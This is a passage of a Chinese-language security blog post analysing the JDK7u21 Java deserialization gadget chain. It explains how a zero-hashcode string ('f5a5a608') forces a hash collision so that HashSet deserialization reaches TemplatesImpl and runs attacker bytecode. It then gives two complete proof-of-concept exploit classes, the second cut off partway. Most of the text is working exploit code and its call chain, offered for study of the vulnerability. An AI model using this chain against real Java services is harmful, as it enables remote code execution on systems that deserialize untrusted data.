+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">COPYpublic <span class="keyword">class</span> <span class="title class_">HashSet</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">Set</span>&lt;E&gt;, Cloneable, java.io.Serializable</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in size</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT); <span class="comment">// 看这里，将对象放入一个HashMap的key处</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再来看<code>HashMap</code>中的<code>put</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">COPYpublic <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<span class="comment">//这里触发equals</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在<code>put</code>方法中确实可以触发<code>equals</code>，但是，触发这个<code>equals</code>似乎是有条件的，也就是<code>e.hash == hash</code>成立以及<code>(k = e.key) == key</code>不成立，也就是说这两个对象的<code>hash</code>值要相等且这两个对象不能相等，这样才能触发进<code>key.equals(k)</code></p>
+<p>所以说我们接下来的任务，就是让<code>proxy</code>对象的hash值，等于<code>TemplateImpl</code>对象的hash值</p>
+<h3 id="hash值构造"><a class="markdownIt-Anchor" href="#hash值构造"></a> hash值构造</h3>
+<p>要想让这两个对象的hash值相同，我们首先的先看看hash值是如何计算的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">COPYfinal <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>里面只有一个变量，那就是<code>k.hashCode()</code>，除此之外其它都是一样的，也就是说<code>hash()</code>的计算结果也就取决于<code>k.hashCode()</code>的结果，<code>TemplateImpl</code>中的<code>hashcode()</code>方法每次运行都会发生变化，我们没办法操作，于是乎就只有看看<code>proxy</code>中的<code>hashcode()</code>方法，<code>proxy</code>对象是我们利用动态代理创建的实现类，那么调用它的任何方法都会进入到<code>AnnotationInvocationHandler#invoke</code>中，<code>hashcode()</code>当然也不例外，看看前面的代码，它会调入到<code>this.hashCodeImpl()</code>中，看看这个方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">COPYprivate <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); </span><br><span class="line">        var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>它会遍历<code>memberValues</code>(也就是它的构造方法中我们最开始传入的HashMap)中的每个key和value，计算每个<code>(127 * key.hashCode()) ^ value.hashCode()</code>并求和。</p>
+<p>JDK7u21中使用了一个非常巧妙的方法：</p>
+<ul>
+<li>当memberValues中只有一个key和一个value时，该哈希简化成<code>(127 * key.hashCode()) ^ value.hashCode()</code></li>
+<li>当key.hashCode()等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成<code>value.hashCode()</code>。</li>
+<li>当value就是TemplateImpl对象时，这两个对象的哈希就完全相等。</li>
+</ul>
+<p>现在我们的目标就是找到一个<code>hashcode</code>为0的字符串，写个脚本遍历就行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">COPYpublic <span class="keyword">class</span> <span class="title class_">test111</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">long</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Long.toHexString(i).hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Long.toHexString(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//f5a5a608</span></span><br></pre></td></tr></table></figure>
+<p>因此：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesImpl);</span><br></pre></td></tr></table></figure>
+<p>这个字符串的hashCode()返回值是0，那么<code>proxy.hashCode()</code>的返回值就是templatesImpl的<code>hashCode</code>，在最后HashMap.put的判断里：<code>proxy.hashCode()</code>就会等于<code>templatesImpl.hashCode()</code>，就会进入proxy.equals了。</p>
+<h2 id="构造"><a class="markdownIt-Anchor" href="#构造"></a> 构造</h2>
+<p>首先是雷打不动的<code>TemplatesImpl</code>对象的设置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);</span><br><span class="line">       setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">       setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+<p>然后去产生<code>AnnotationInvocationHandler</code>对象，注意它的构造器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>type</code>是<code>Templates.class</code>，<code>memberValues</code>就是要设置的那个巧妙的<code>Map</code>了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 实例化一个map，并添加f5a5a608为key，value先随便设置一个值</span></span><br><span class="line"> <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"> map.put(zeroHashCodeStr, <span class="string">&quot;clyyy&quot;</span>);</span><br><span class="line"><span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line"> <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"> handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br></pre></td></tr></table></figure>
+<p>但是先暂时不把<code>TemplatesImpl</code>放进<code>map</code>，接下来会说为什么。</p>
+<p>然后就是动态代理的生成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为tempHandler创造实现类对象</span></span><br><span class="line">       <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(test.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);</span><br></pre></td></tr></table></figure>
+<p>然后就是生成反序列化链的起点，那个<code>HashSet</code>对象了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);<span class="comment">//这个顺序非常重要，不能反着来哈</span></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br></pre></td></tr></table></figure>
+<p>这里再覆盖掉<code>f5a5a608</code>的value，就是为了防止这里的2次<code>add</code>直接触发了漏洞。</p>
+<h2 id="总链流程"><a class="markdownIt-Anchor" href="#总链流程"></a> 总链流程</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line"> └── LinkedHashSet.readObject()</span><br><span class="line">      └── HashSet.add()</span><br><span class="line">           └── HashMap.put()</span><br><span class="line">                └── key.equals()</span><br><span class="line">                     └── Proxy.equals()</span><br><span class="line">                          └── AnnotationInvocationHandler.invoke()</span><br><span class="line">                               └── equalsImpl()</span><br><span class="line">                                    └── value.equals()</span><br><span class="line">                                         └── TemplatesImpl.toString()</span><br><span class="line">                                              └── getOutputProperties()</span><br><span class="line">                                                   └── newTransformer()</span><br><span class="line">                                                        └── defineTransletClasses()</span><br><span class="line">                                                             └── 恶意字节码执行</span><br></pre></td></tr></table></figure>
+<p>首先是触发<code>HashSet</code>的<code>readObject</code>方法，其中使用<code>HashMap</code>的<code>key</code>做去重，将我们的<code>TemplatesImpl</code>对象和<code>proxy</code>对象放到<code>key</code>处，去重时计算这两个元素的<code>hashCode()</code> ，由于我们的构造，这两个元素的<code>hashcode()</code>相等，所以说进而触发<code>proxy</code>的 <code>equals()</code>方法，进入到代理类的对象的<code>invoke</code>方法中，然后调用<code>equalsImpl()</code>方法，在<code>equalsImpl()</code> 中遍历<code>this.type</code>中的每个方法并调用，由于我们的 <code>this.type</code>是<code>TemplatesImpl</code>类，所以触发了<code>newTransform()</code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行</p>
+<h2 id="总poc"><a class="markdownIt-Anchor" href="#总poc"></a> 总POC</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] barr)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化一个map，并添加f5a5a608为key，value先随便设置一个值</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;clyyy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为tempHandler创造实现类对象</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(test.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line"></span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);<span class="comment">//这个顺序非常重要，不能反着来哈</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span> []o = serialize(set);</span><br><span class="line"></span><br><span class="line">        unserialize(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="poc2"><a class="markdownIt-Anchor" href="#poc2"></a> POC2</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Base.Unserialize.Jdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk7u21Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">harmlessTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String hashCodeStr=<span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(hashCodeStr, harmlessTemplates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class,innerMap);</span><br><span class="line">        setFieldValue(invocationHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                jdk7u21Unserialize.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                invocationHandler</span><br><span class="line">        );</span><br><span class="line">        HashSet set=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(proxyMap);</span><br><span class="line">        set.add(harmlessTemplates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Base.Unserialize.Base.Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data=serialize(set);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>unserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object 